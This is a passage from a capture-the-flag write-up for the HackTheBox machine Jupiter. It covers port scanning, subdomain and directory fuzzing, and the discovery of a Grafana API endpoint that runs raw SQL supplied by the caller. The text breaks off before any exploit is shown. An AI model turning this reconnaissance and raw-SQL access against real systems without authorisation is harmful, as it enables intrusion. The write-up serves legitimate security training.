HTB: Jupiter
============

![Jupiter](https://0xdf.gitlab.io/img/jupiter-cover.png)

Jupiter starts with a Grafana dashboard. I’ll find an endpoint in Grafana that allows me to send raw SQL queries that are executed by the PostgreSQL database, and use that to get code execution on the host. Then I’ll exploit a cron running Shadow Simulator to pivot to the next user. Then, I’ll get access to a Jupyter Notebook, and use it to pivot again. To get a shell as root, I’ll exploit a satellite tracking program.

## Box Info

Name[Jupiter](https://www.hackthebox.com/machines/jupiter) [![Jupiter](https://0xdf.gitlab.io/icons/box-jupiter.png)](https://www.hackthebox.com/machines/jupiter)

[Play on HackTheBox](https://www.hackthebox.com/machines/jupiter)Release Date[03 Jun 2023](https://twitter.com/hackthebox_eu/status/1664285868381835266)Retire Date21 Oct 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Jupiter](https://0xdf.gitlab.io/img/jupiter-diff.png)Radar Graph![Radar chart for Jupiter](https://0xdf.gitlab.io/img/jupiter-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:49:15 [![snowscan](https://www.hackthebox.eu/badge/image/9267)](https://app.hackthebox.com/users/9267)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)01:05:20 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

Creator[![mto](https://www.hackthebox.eu/badge/image/216969)](https://app.hackthebox.com/users/216969)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.216
Starting Nmap 7.80 ( https://nmap.org ) at 2023-08-31 15:29 EDT
Nmap scan report for 10.10.11.216
Host is up (0.098s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.216
Starting Nmap 7.80 ( https://nmap.org ) at 2023-08-31 15:29 EDT
Nmap scan report for 10.10.11.216
Host is up (0.098s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The web service on port 80 returns a redirect to `jupiter.htb`.

### Subdomain Fuzz

Given the use of domain names, I’ll fuzz the webserver with different `Host` headers to see if any return different from the default with `ffuf`:

```
oxdf@hacky$ ffuf -u http://10.10.11.216 -H "Host: FUZZ.jupiter.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.216
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 124ms]
:: Progress: [19966/19966] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:49] :: Errors: 0 ::

```

`-mc` looks at all response codes and `-ac` does automatic filtering of default cases. It finds one, `kiosk.jupiter.htb`. I’ll add both to my `/etc/hosts` file:

```
10.10.11.216 jupiter.htb kiosk.jupiter.htb

```

### jupiter.htb - TCP 80

#### Site

The site is about space tourism and data analysis:

![image-20230831153548709](https://0xdf.gitlab.io/img/image-20230831153548709.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The pages linked to across the top lead to various `.html` pages with more text, but nothing that jumps out as interesting. There is an email, `support@jupiter.htb`, on `contact.html`.

#### Tech Stack

The HTTP response headers don’t leak anything beyond nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Aug 2023 19:35:04 GMT
Content-Type: application/javascript
Content-Length: 60132
Last-Modified: Wed, 02 Sep 2020 06:27:56 GMT
Connection: close
ETag: "5f4f3b6c-eae4"
Accept-Ranges: bytes

```

The main page is `index.html`, which matches the extension used on the other pages. There’s nothing interesting in the source, and the 404 page is the default nginx page.

At this point, this look like a static site.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` as that’s what I’ve seen so far:

```
oxdf@hacky$ feroxbuster -u http://jupiter.htb -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://jupiter.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://jupiter.htb/js => http://jupiter.htb/js/
301      GET        7l       12w      178c http://jupiter.htb/css => http://jupiter.htb/css/
301      GET        7l       12w      178c http://jupiter.htb/img => http://jupiter.htb/img/
200      GET      399l     1181w    19680c http://jupiter.htb/
200      GET      225l      536w    10141c http://jupiter.htb/contact.html
200      GET      266l      701w    12613c http://jupiter.htb/about.html
200      GET      251l      759w    11969c http://jupiter.htb/services.html
301      GET        7l       12w      178c http://jupiter.htb/fonts => http://jupiter.htb/fonts/
200      GET      399l     1181w    19680c http://jupiter.htb/index.html
301      GET        7l       12w      178c http://jupiter.htb/img/blog => http://jupiter.htb/img/blog/
301      GET        7l       12w      178c http://jupiter.htb/img/about => http://jupiter.htb/img/about/
200      GET      268l      628w    11913c http://jupiter.htb/portfolio.html
301      GET        7l       12w      178c http://jupiter.htb/img/icons => http://jupiter.htb/img/icons/
301      GET        7l       12w      178c http://jupiter.htb/img/portfolio => http://jupiter.htb/img/portfolio/
301      GET        7l       12w      178c http://jupiter.htb/img/work => http://jupiter.htb/img/work/
301      GET        7l       12w      178c http://jupiter.htb/img/logo => http://jupiter.htb/img/logo/
301      GET        7l       12w      178c http://jupiter.htb/img/team => http://jupiter.htb/img/team/
301      GET        7l       12w      178c http://jupiter.htb/Source => http://jupiter.htb/Source/
301      GET        7l       12w      178c http://jupiter.htb/img/testimonial => http://jupiter.htb/img/testimonial/
301      GET        7l       12w      178c http://jupiter.htb/img/hero => http://jupiter.htb/img/hero/
[####################] - 3m    450000/450000  0s      found:20      errors:62
[####################] - 2m     30000/30000   242/s   http://jupiter.htb/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/js/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/css/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/fonts/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/blog/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/about/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/icons/
[####################] - 2m     30000/30000   244/s   http://jupiter.htb/img/portfolio/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/work/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/logo/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/team/
[####################] - 2m     30000/30000   244/s   http://jupiter.htb/Source/
[####################] - 2m     30000/30000   243/s   http://jupiter.htb/img/testimonial/
[####################] - 2m     30000/30000   246/s   http://jupiter.htb/img/hero/

```

Not anything useful here.

### kiosk.jupiter.htb

#### Site

This site gives a dashboard view of information about moons:

![image-20230831154551219](https://0xdf.gitlab.io/img/image-20230831154551219.png)

#### Tech Stack

The logo at the top right is a Grafana logo, and the title of the page is “Moons - Dashboards - Grafana”. The menu offers some settings, but nothing that I’m able to make interesting:

![image-20230831154731680](https://0xdf.gitlab.io/img/image-20230831154731680.png)

## Shell as postgres

### Enumerating Grafana Requests

Grafana does some weird stuff with HTTP requests. Loading `/` ends up at `/d/jMgFGfA4z/moons?orgId=1&refresh=1d`. Looking in Burp at the requests that are made to get there, there are many:

![image-20230831155551744](https://0xdf.gitlab.io/img/image-20230831155551744.png)

The `/api/dashboards/home` request returns the redirect to the `moons` page:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Aug 2023 19:45:20 GMT
Content-Type: application/json
Content-Length: 36
Connection: close
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block

{"redirectUri":"/d/jMgFGfA4z/moons"}

```

The `/api/dashboards/uid/jMgFGfA4z` returns sends back all the data for the dashboard:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Aug 2023 19:45:21 GMT
Content-Type: application/json
Connection: close
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
Content-Length: 15093

{"meta":{"type":"db","canSave":false,"canEdit":false,"canAdmin":false,"canStar":false,"canDelete":false,"slug":"moons","url":"/d/jMgFGfA4z/moons","expires":"0001-01-01T00:00:00Z","created":"2023-03-07T11:24:34Z","updated":"2023-03-07T11:38:14Z","updatedBy":"admin","createdBy":"admin","version":2,"hasAcl":false,"isFolder":false,"folderId":0,"folderUid":"","folderTitle":"General","folderUrl":"","provisioned":false,"provisionedExternalId":"","annotationsPermissions":{"dashboard":{"canAdd":true,"canEdit":true,"canDelete":true},"organization":{"canAdd":false,"canEdit":false,"canDelete":false}},"publicDashboardAccessToken":"","publicDashboardUid":"","publicDashboardEnabled":false},"dashboard":{"annotations":{"list":[{"builtIn":1,"datasource":{"type":"grafana","uid":"-- Grafana --"},"enable":true,"hide":true,"iconColor":"rgba(0, 211, 255, 1)","name":"Annotations \u0026 Alerts","target":{"limit":100,"matchAny":false,"tags":[],"type":"dashboard"},"type":"dashboard"}]},"editable":true,"fiscalYearStartMonth":0,"graphTooltip":0,"id":1,"links":[],"liveNow":false,"panels":[{"datasource":{"type":"fetzerch-sunandmoon-datasource","uid":"r-0ffJ04k"},"description":"","gridPos":{"h":14,"w":6,"x":0,"y":0},"id":40,"options":{"code":{"language":"plaintext","showLineNumbers":false,"showMiniMap":false},"content":"# What are Moons?\nMoons – also known as natural satellites – orbit planets and asteroids in our solar system. Earth has one moon, and there are more than 200 moons in our solar system. Most of the major planets – all except Mercury and Venus – have moons. Pluto and some other dwarf planets, as well as many asteroids, also have small moons. Saturn and Jupiter have the most moons, with dozens orbiting each of the two giant planets.\n\nMoons come in many shapes, sizes, and types. A few have atmospheres and even hidden oceans beneath their surfaces. Most planetary moons probably formed from the discs of gas and dust circulating around planets in the early solar system, though some are \"captured\" objects that formed elsewhere and fell into orbit around larger worlds.\n\nSource: https://solarsystem.nasa.gov/moons/overview/","mode":"markdown"},"pluginVersion":"9.4.3","transparent":true,"type":"text"},{"datasource":{"type":"fetzerch-sunandmoon-datasource","uid":"r-0ffJ04k"},"description":"","gridPos":{"h":14,"w":18,"x":6,"y":0},"id":42,"options":{"code":{"language":"plaintext","showLineNumbers":false,"showMiniMap":false},"content":"\u003cimg src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/FullMoon2010.jpg/1200px-FullMoon2010.jpg\"\u003e","mode":"html"},"pluginVersion":"9.4.3","title":"The near side of the Moon (north at top) as seen from Earth","transparent":true,"type":"text"},{"collapsed":false,"gridPos":{"h":1,"w":24,"x":0,"y":14},"id":20,"panels":[],"title":"Saturn","type":"row"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"custom":{"align":"auto","cellOptions":{"type":"auto"},"inspect":false},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":0,"y":15},"id":24,"options":{"footer":{"countRows":false,"enablePagination":true,"fields":"","reducer":["sum"],"show":false},"showHeader":true},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Moons of Planet Saturn","transparent":true,"type":"table"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"mappings":[],"thresholds":{"mode":"percentage","steps":[{"color":"green","value":null},{"color":"orange","value":70},{"color":"red","value":85}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":12,"y":15},"id":22,"options":{"colorMode":"value","graphMode":"area","justifyMode":"auto","orientation":"auto","reduceOptions":{"calcs":["lastNotNull"],"fields":"","values":false},"textMode":"auto"},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Saturn';","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Number of Moons","type":"stat"},{"gridPos":{"h":1,"w":24,"x":0,"y":23},"id":26,"title":"Jupiter","type":"row"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"mappings":[],"thresholds":{"mode":"percentage","steps":[{"color":"green","value":null},{"color":"orange","value":70},{"color":"red","value":85}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":0,"y":24},"id":30,"options":{"colorMode":"value","graphMode":"area","justifyMode":"auto","orientation":"auto","reduceOptions":{"calcs":["lastNotNull"],"fields":"","values":false},"textMode":"auto"},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Jupiter';","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Number of Moons","type":"stat"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"custom":{"align":"auto","cellOptions":{"type":"auto"},"inspect":false},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":12,"y":24},"id":28,"options":{"footer":{"countRows":false,"enablePagination":true,"fields":"","reducer":["sum"],"show":false},"showHeader":true},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Moons of Planet Jupiter","transparent":true,"type":"table"},{"collapsed":false,"gridPos":{"h":1,"w":24,"x":0,"y":32},"id":32,"panels":[],"title":"Uranus","type":"row"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"custom":{"align":"auto","cellOptions":{"type":"auto"},"inspect":false},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":0,"y":33},"id":36,"options":{"footer":{"countRows":false,"enablePagination":true,"fields":"","reducer":["sum"],"show":false},"showHeader":true},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select name as \"Name\", parent as \"Parent Planet\", meaning as \"Name Meaning\" from moons where parent = 'Uranus' order by name desc;","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Moons of Planet Uranus","transparent":true,"type":"table"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"continuous-GrYlRd"},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":12,"y":33},"id":34,"options":{"colorMode":"value","graphMode":"area","justifyMode":"auto","orientation":"horizontal","reduceOptions":{"calcs":["lastNotNull"],"fields":"","values":false},"textMode":"auto"},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Uranus';","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Number of Moons","type":"stat"},{"collapsed":false,"gridPos":{"h":1,"w":24,"x":0,"y":41},"id":14,"panels":[],"title":"Neptune","type":"row"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"continuous-GrYlRd"},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":0,"y":42},"id":18,"options":{"colorMode":"value","graphMode":"area","justifyMode":"auto","orientation":"horizontal","reduceOptions":{"calcs":["lastNotNull"],"fields":"","values":false},"textMode":"auto"},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Neptune';","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Number of Moons","type":"stat"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"custom":{"align":"auto","cellOptions":{"type":"auto"},"inspect":false},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":12,"y":42},"id":16,"options":{"footer":{"countRows":false,"enablePagination":true,"fields":"","reducer":["sum"],"show":false},"showHeader":true},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Neptune' \norder by \n  name desc;","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Moons of Planet Neptune","transparent":true,"type":"table"},{"gridPos":{"h":1,"w":24,"x":0,"y":50},"id":8,"title":"Mars","type":"row"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"custom":{"align":"auto","cellOptions":{"type":"auto"},"inspect":false},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":0,"y":51},"id":12,"options":{"footer":{"countRows":false,"enablePagination":true,"fields":"","reducer":["sum"],"show":false},"showHeader":true},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Mars' \norder by \n  name desc;","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Moons of Planet Mars","transparent":true,"type":"table"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"continuous-GrYlRd"},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":12,"y":51},"id":10,"options":{"colorMode":"value","graphMode":"area","justifyMode":"auto","orientation":"horizontal","reduceOptions":{"calcs":["lastNotNull"],"fields":"","values":false},"textMode":"auto"},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Mars';","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Number of Moons","type":"stat"},{"collapsed":false,"gridPos":{"h":1,"w":24,"x":0,"y":59},"id":2,"panels":[],"title":"Earth","type":"row"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"continuous-GrYlRd"},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":0,"y":60},"id":6,"options":{"colorMode":"value","graphMode":"area","justifyMode":"auto","orientation":"horizontal","reduceOptions":{"calcs":["lastNotNull"],"fields":"","values":false},"textMode":"auto"},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Earth';","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Number of Moons","type":"stat"},{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"fieldConfig":{"defaults":{"color":{"mode":"thresholds"},"custom":{"align":"auto","cellOptions":{"type":"auto"},"inspect":false},"mappings":[],"thresholds":{"mode":"absolute","steps":[{"color":"green","value":null},{"color":"red","value":80}]}},"overrides":[]},"gridPos":{"h":8,"w":12,"x":12,"y":60},"id":4,"options":{"footer":{"countRows":false,"enablePagination":true,"fields":"","reducer":["sum"],"show":false},"showHeader":true},"pluginVersion":"9.4.3","targets":[{"datasource":{"type":"postgres","uid":"YItSLg-Vz"},"editorMode":"code","format":"table","hide":false,"rawQuery":true,"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Earth' \norder by \n  name desc;","refId":"A","sql":{"columns":[{"parameters":[],"type":"function"}],"groupBy":[{"property":{"type":"string"},"type":"groupBy"}],"limit":50}}],"title":"Moons of Planet Earth","transparent":true,"type":"table"}],"refresh":"1d","revision":1,"schemaVersion":38,"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":"now-6h","to":"now"},"timepicker":{},"timezone":"","title":"Moons","uid":"jMgFGfA4z","version":2,"weekStart":""}}

```

There’s a ton in there. `"type": "db"` is interesting. It isn’t set to save, edit, admin, star, or delete. There’s a username, admin.

The next couple of requests return empty.

`/api/ds/query` is where it gets really interesting. The request looks like this:

```
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 24
x-plugin-id: postgres
Content-Length: 484
Origin: http://kiosk.jupiter.htb
Connection: close

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":476}],"range":{"from":"2023-08-31T13:45:21.446Z","to":"2023-08-31T19:45:21.446Z","raw":{"from":"now-6h","to":"now"}},"from":"1693489521446","to":"1693511121446"}

```

The body pretty printed looks like:

```
{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = Saturn \norder by \n  name desc;",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 476
    }
  ],
  "range": {
    "from": "2023-08-31T13:45:21.446Z",
    "to": "2023-08-31T19:45:21.446Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1693489521446",
  "to": "1693511121446"
}

```

It’s a post request containing a `rawSql` field! It even contains the type of DB, Postgres. The response looks like it has the results:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Aug 2023 19:45:21 GMT
Content-Type: application/json
Connection: close
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
Content-Length: 5270

{"results":{"A":{"status":200,"frames":[{"schema":{"refId":"A","meta":{"typeVersion":[0,0],"executedQueryString":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;"},"fields":[{"name":"Name","type":"string","typeInfo":{"frame":"string","nullable":true}},{"name":"Parent Planet","type":"string","typeInfo":{"frame":"string","nullable":true}},{"name":"Name Meaning","type":"string","typeInfo":{"frame":"string","nullable":true}}]},"data":{"values":[["Ymir","Titan","Thrymr","Thiazzi","Tethys","Telesto","Tarvos","Tarqeq","Suttungr","Surtur","Skrymir","Skoll","Skathi","Siarnaq","S/2019 S 1","S/2009 S 1","S/2007 S 3","S/2007 S 2","S/2006 S 3","S/2006 S 1","S/2004 S 7","S/2004 S 39","S/2004 S 37","S/2004 S 36","S/2004 S 34","S/2004 S 31","S/2004 S 29","S/2004 S 28","S/2004 S 26","S/2004 S 24","S/2004 S 21","S/2004 S 17","S/2004 S 13","S/2004 S 12","Rhea","Prometheus","Polydeuces","Phoebe","Pandora","Pan","Pallene","Narvi","Mundilfari","Mimas","Methone","Loge","Kiviuq","Kari","Jarnsaxa","Janus","Ijiraq","Iapetus","Hyrrokkin","Hyperion","Helene","Hati","Gunnlod","Gridr","Greip","Gerd","Geirrod","Farbauti","Farbauti","Erriapus","Epimetheus","Enceladus","Eggther","Dione","Daphnis","Calypso","Bestla","Beli","Bebhionn","Atlas","Anthe","Angrboda","Alvaldi","Albiorix","Aegir","Aegaeon"],["Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn","Saturn"],["Ancestor to all the frost giants in Norse mythology. Also known as Aurgelmir, Birmir, or Blainn","Named 